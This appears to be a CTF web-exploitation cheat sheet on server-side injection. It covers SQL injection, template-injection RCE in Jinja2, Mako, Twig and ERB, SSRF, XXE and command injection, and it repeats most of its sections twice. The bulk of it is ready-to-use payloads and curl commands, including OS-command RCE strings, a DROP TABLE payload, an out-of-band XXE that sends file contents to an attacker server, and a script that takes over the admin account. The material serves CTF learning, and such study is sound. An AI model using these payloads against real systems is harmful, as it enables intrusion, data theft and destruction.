### WAF Bypass via XML Entity Encoding (Crypto-Cat)
When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```
This decodes to `1 UNION SELECT username FROM users` after XML processing.

**Encoding reference:**
| Keyword | XML Hex Entities |
|---------|-----------------|
| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.

**With sqlmap:** Use the `hexentities` tamper script. To prevent `&amp;` double-encoding of entities, modify `sqlmap/lib/request/connect.py`.

### SQLi via EXIF Metadata Injection (29c3 CTF 2012)

**Pattern:** Application extracts EXIF metadata from uploaded images (e.g., Comment, Artist, Description, Copyright) and inserts the values into SQL queries without sanitization. SQL payloads embedded in EXIF fields bypass WAFs that only inspect HTTP request bodies and URL parameters.

**Injecting SQL into EXIF fields:**
```bash
# Set EXIF Comment field to SQL payload
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg

# Other injectable EXIF fields
exiftool -Artist="' OR 1=1--" image.jpg
exiftool -ImageDescription="'; DROP TABLE uploads;--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg

# XMP metadata (often parsed by web applications)
exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" image.jpg
```

**Key insight:** Image galleries, photo management apps, and any upload endpoint that stores or displays EXIF data may feed metadata directly into SQL queries. WAFs and input filters typically inspect form fields and URL parameters but not binary file content. The EXIF fields survive re-encoding unless the application explicitly strips metadata (e.g., with `exiftool -all=`).

**Detection:** Upload endpoint that displays metadata (camera model, description, location) after upload. Check if special characters in EXIF fields cause SQL errors in the response.

---

## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**Pattern (Checking It Twice):** User input passed to `ejs.render()` in error paths.
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)

**Pattern (Treasure Hunt 5):** Sinatra (Ruby) app uses ERB templates. ERBSandbox restricts direct database access, but `Sequel::DATABASES` global list is unrestricted.

**Detection:** Ruby/Sinatra app, `require 'erb'` in source. Cookie or parameter reflected in rendered response.

```bash
# Confirm SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# Response contains "49"

# Enumerate tables
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# Dump schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# Exfiltrate data
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**Key insight:** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.

### Mako SSTI

```python
# Detection
${7*7}  # Returns 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

**Key insight:** Mako templates (Python) execute Python code directly inside `${}` or `<% %>` blocks — no sandbox, no class traversal needed. Detection identical to Jinja2 (`${7*7}`) but payloads are plain Python.

### Twig SSTI

```twig
{# Detection #}
{{7*7}}   {# Returns 49 #}
{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}

{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.

### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**How it works:**
1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
3. The attribute change persists across requests in the session

**Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).

---

## SSRF

### Host Header SSRF (MireaCTF)

Server-side code uses the HTTP `Host` header to construct internal validation requests:
```go
// Vulnerable: uses client-controlled Host header for internal request
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**Exploitation:**
1. Set up an attacker-controlled server returning the desired response:
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**Key insight:** The server makes an internal HTTP request to `http://<Host-header>/validate` instead of `http://localhost/validate`. By setting the Host header to an attacker-controlled domain, the validation request goes to the attacker's server, which returns `{"access": true}`. This bypasses IP-based access controls entirely.

**Detection:** Server code that builds URLs from `request.Host`, `request.headers['Host']`, `c.Request.Host` (Go/Gin), or `$_SERVER['HTTP_HOST']` (PHP) for internal service calls.

---

### DNS Rebinding for TOCTOU
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
After `CURLOPT_MAXREDIRS` exceeded, some implementations make one more unvalidated request:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE with External DTD
Host evil.dtd:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

---

## Command Injection

### Newline Bypass
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### Incomplete Blocklist Bypass
When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
Common missed: `;` semicolons, backticks, `$()` substitution

### Sendmail Parameter Injection via CGI (SECCON 2015)

When CGI scripts pass user input to `sendmail` via `open()` pipe:

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

Inject shell commands by breaking out of the quoted context:

```
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

The `-bp` flag forces sendmail into queue-print mode (non-interactive), and `|` pipes to shell. Discovery chain: find `.cgi_bak` backup files to read source → identify injection point → execute commands.

### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)

When a service processes images containing barcodes (via zbar/zxing), multiple barcodes in one image get concatenated into a single string. Exploit by combining a valid barcode with a malicious Code128 barcode:

1. **Create valid barcode:** Generate UPC/EAN-13 barcode that passes type validation
2. **Create injection barcode:** Generate Code128 barcode containing shell metacharacters:
   ```
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. **Combine into single image:** `montage valid.png malicious.png -tile 2x1 combined.png`
4. **Upload:** Scanner reads both barcodes, concatenates values, and passes to a system() call or JSON parser

```bash
# Generate Code128 barcode with injection payload
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
# Combine with valid UPC barcode
montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
```

**Key insight:** Barcode libraries process ALL detected barcodes in an image. Type validation (e.g., "must be UPC") may only check the first barcode, while concatenated output from all barcodes flows into downstream processing. This is analogous to HTTP parameter pollution but for visual data.

---

*See also: [server-side-exec.md](server-side-exec.md) for code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, and more).*


<!-- APPENDED FROM LATEST UPDATE: ctf-web/server-side.md -->

# CTF Web - Server-Side Injection Attacks

## Table of Contents
- [PHP Type Juggling](#php-type-juggling)
- [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter)
- [SQL Injection](#sql-injection)
  - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
  - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
  - [Second-Order SQL Injection](#second-order-sql-injection)
  - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
  - [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
  - [SQLi to SSTI Chain](#sqli-to-ssti-chain)
  - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
  - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
  - [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go Template Injection](#go-template-injection)
  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
  - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [Basic XXE](#basic-xxe)
  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
- [Command Injection](#command-injection)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)

For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS), see [server-side-exec.md](server-side-exec.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

---

## PHP Type Juggling

**Pattern:** PHP loose comparison (`==`) performs implicit type conversion, leading to unexpected equality results that bypass authentication and validation checks.

**Comparison table (all `true` with `==`):**
| Comparison | Result | Why |
|-----------|--------|-----|
| `0 == "php"` | `true` | Non-numeric string converts to `0` |
| `0 == ""` | `true` | Empty string converts to `0` |
| `"0" == false` | `true` | `"0"` is falsy |
| `NULL == false` | `true` | Both falsy |
| `NULL == ""` | `true` | Both falsy |
| `NULL == array()` | `true` | Both empty |
| `"0e123" == "0e456"` | `true` | Both parse as `0` in scientific notation |

**Auth bypass with type juggling:**
```php
// Vulnerable: if ($input == $password)
// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// Both compare as 0 == 0 → true
```

**Exploit via JSON type confusion:**
```bash
# Send integer 0 instead of string to bypass strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**Array bypass for strcmp:**
```bash
# strcmp(array, string) returns NULL, which == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
```

**Prevention:** Use strict comparison (`===`) which checks both value and type.

**Key insight:** Always test `0`, `""`, `NULL`, `[]`, and `"0e..."` magic hash values against PHP comparison endpoints. JSON `Content-Type` allows sending integer `0` where the application expects a string.

---

## PHP File Inclusion / php://filter

**Pattern:** PHP `include`, `require`, `require_once` accept dynamic paths. Combined with `php://filter`, leak source code without execution.

**Basic LFI:**
```php
// Vulnerable: include($_GET['page'] . ".php");
// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
// Modern: page=php://filter/convert.base64-encode/resource=index
```

**Source code disclosure via php://filter:**
```bash
# Base64-encode prevents PHP execution, leaks raw source
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# Output: <?php $password = "s3cr3t"; ...
```

**Filter chains for RCE (PHP >= 7):**
```bash
# Chain convert filters to write arbitrary content
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**Common LFI targets:**
```text
/etc/passwd                          # User enumeration
/proc/self/environ                   # Environment variables (secrets)
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Log poisoning vector
/var/www/html/config.php             # Application secrets
php://filter/convert.base64-encode/resource=index  # Source code
```

**Key insight:** `php://filter/convert.base64-encode/resource=` is the most reliable way to read PHP source code through an LFI — base64 encoding prevents the included file from being executed as PHP.

---

## SQL Injection

### Backslash Escape Quote Bypass
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# With username=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for SSTI injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

### Second-Order SQL Injection
**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. Login normally
3. View profile → injected SQL executes in query using stored username

```python
import requests

s = requests.Session()

# Step 1: Store malicious payload (safely escaped during INSERT)
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# Step 2: Trigger — payload retrieved from DB and used unsafely
# Common triggers: password change, profile update, search using stored value
s.post("https://target.com/change-password", data={
    "old_password": "anything",
    "new_password": "hacked"
})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# Result: admin password changed
```

**Key insight:** Second-order SQLi occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.

### SQLi LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

### MySQL Column Truncation (VolgaCTF 2014)

**Pattern:** Registration form backed by MySQL `VARCHAR(N)`. MySQL silently truncates strings longer than N characters, and ignores trailing spaces in string comparison. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.

```bash
# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
# MySQL truncates to "admin               " → matches "admin" in comparisons

# Register duplicate admin with attacker password
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'

# Login as admin with attacker password
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

**Why it works:**
1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT
2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
4. The application now has two rows matching "admin" — the original and the attacker's

**Key insight:** MySQL's PAD SPACE collation means `"admin" = "admin     "` evaluates to true. Combined with silent `VARCHAR` truncation, registering with a space-padded username creates a second account that the application treats as the original admin. This bypasses registration duplicate checks that use `WHERE username = ?` (since the padded version isn't an exact match before truncation). Fixed in MySQL 8.0+ with `NO_PAD` collations.

### SQLi to SSTI Chain
When SQLi result gets rendered in a template:
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# Final: username=x\&password=) union select 1, {hex_payload}#
```

### MySQL information_schema.processList Trick
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

### WAF Bypass via XML Entity Encoding (Crypto-Cat)
When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```
This decodes to `1 UNION SELECT username FROM users` after XML processing.

**Encoding reference:**
| Keyword | XML Hex Entities |
|---------|-----------------|
| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.

**With sqlmap:** Use the `hexentities` tamper script. To prevent `&amp;` double-encoding of entities, modify `sqlmap/lib/request/connect.py`.

### SQLi via EXIF Metadata Injection (29c3 CTF 2012)

**Pattern:** Application extracts EXIF metadata from uploaded images (e.g., Comment, Artist, Description, Copyright) and inserts the values into SQL queries without sanitization. SQL payloads embedded in EXIF fields bypass WAFs that only inspect HTTP request bodies and URL parameters.

**Injecting SQL into EXIF fields:**
```bash
# Set EXIF Comment field to SQL payload
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg

# Other injectable EXIF fields
exiftool -Artist="' OR 1=1--" image.jpg
exiftool -ImageDescription="'; DROP TABLE uploads;--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg

# XMP metadata (often parsed by web applications)
exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" image.jpg
```

**Key insight:** Image galleries, photo management apps, and any upload endpoint that stores or displays EXIF data may feed metadata directly into SQL queries. WAFs and input filters typically inspect form fields and URL parameters but not binary file content. The EXIF fields survive re-encoding unless the application explicitly strips metadata (e.g., with `exiftool -all=`).

**Detection:** Upload endpoint that displays metadata (camera model, description, location) after upload. Check if special characters in EXIF fields cause SQL errors in the response.

---

## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**Pattern (Checking It Twice):** User input passed to `ejs.render()` in error paths.
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)

**Pattern (Treasure Hunt 5):** Sinatra (Ruby) app uses ERB templates. ERBSandbox restricts direct database access, but `Sequel::DATABASES` global list is unrestricted.

**Detection:** Ruby/Sinatra app, `require 'erb'` in source. Cookie or parameter reflected in rendered response.

```bash
# Confirm SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# Response contains "49"

# Enumerate tables
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# Dump schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# Exfiltrate data
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**Key insight:** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.

### Mako SSTI

```python
# Detection
${7*7}  # Returns 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

**Key insight:** Mako templates (Python) execute Python code directly inside `${}` or `<% %>` blocks — no sandbox, no class traversal needed. Detection identical to Jinja2 (`${7*7}`) but payloads are plain Python.

### Twig SSTI

```twig
{# Detection #}
{{7*7}}   {# Returns 49 #}
{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}

{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.

### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**How it works:**
1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
3. The attribute change persists across requests in the session

**Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).

---

## SSRF

### Host Header SSRF (MireaCTF)

Server-side code uses the HTTP `Host` header to construct internal validation requests:
```go
// Vulnerable: uses client-controlled Host header for internal request
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**Exploitation:**
1. Set up an attacker-controlled server returning the desired response:
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**Key insight:** The server makes an internal HTTP request to `http://<Host-header>/validate` instead of `http://localhost/validate`. By setting the Host header to an attacker-controlled domain, the validation request goes to the attacker's server, which returns `{"access": true}`. This bypasses IP-based access controls entirely.

**Detection:** Server code that builds URLs from `request.Host`, `request.headers['Host']`, `c.Request.Host` (Go/Gin), or `$_SERVER['HTTP_HOST']` (PHP) for internal service calls.

---

### DNS Rebinding for TOCTOU
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
After `CURLOPT_MAXREDIRS` exceeded, some implementations make one more unvalidated request:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE with External DTD
Host evil.dtd:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

---

## Command Injection

### Newline Bypass
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### Incomplete Blocklist Bypass
When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
Common missed: `;` semicolons, backticks, `$()` substitution

### Sendmail Parameter Injection via CGI (SECCON 2015)

When CGI scripts pass user input to `sendmail` via `open()` pipe:

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

Inject shell commands by breaking out of the quoted context:

```
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

The `-bp` flag forces sendmail into queue-print mode (non-interactive), and `|` pipes to shell. Discovery chain: find `.cgi_bak` backup files to read source → identify injection point → execute commands.

### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)

When a service processes images containing barcodes (via zbar/zxing), multiple barcodes in one image get concatenated into a single string. Exploit by combining a valid barcode with a malicious Code128 barcode:

1. **Create valid barcode:** Generate UPC/EAN-13 barcode that passes type validation
2. **Create injection barcode:** Generate Code128 barcode containing shell metacharacters:
   ```
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. **Combine into single image:** `montage valid.png malicious.png -tile 2x1 combined.png`
4. **Upload:** Scanner reads both barcodes, concatenates values, and passes to a system() call or JSON parser

```bash
# Generate Code128 barcode with injection payload
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
# Combine with valid UPC barcode
montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
```

**Key insight:** Barcode libraries process ALL detected barcodes in an image. Type validation (e.g., "must be UPC") may only check the first barcode, while concatenated output from all barcodes flows into downstream processing. This is analogous to HTTP parameter pollution but for visual data.

---

*See also: [server-side-exec.md](server-side-exec.md) for code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, and more).*
